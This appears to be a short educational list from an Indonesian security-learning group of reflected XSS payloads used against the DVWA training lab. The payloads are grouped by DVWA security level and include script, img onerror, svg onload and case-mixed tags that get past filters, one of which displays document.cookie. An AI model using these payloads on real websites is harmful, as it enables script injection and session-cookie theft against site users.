# Sec-Aceh XSS Payloads - DVWA Lab
Kumpulan payload Reflected XSS dari belajar DVWA bareng Sec-Aceh.

LOW Level
<script>alert('XSS by debker')</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>

MEDIUM Level - Bypass script
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>

HIGH Level
<ScRiPt>alert(1)</ScRiPt>

Reflected Link Jebakan Lab Only
http://localhost/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E

Author: debker - Sec-Aceh - Edukasi Only
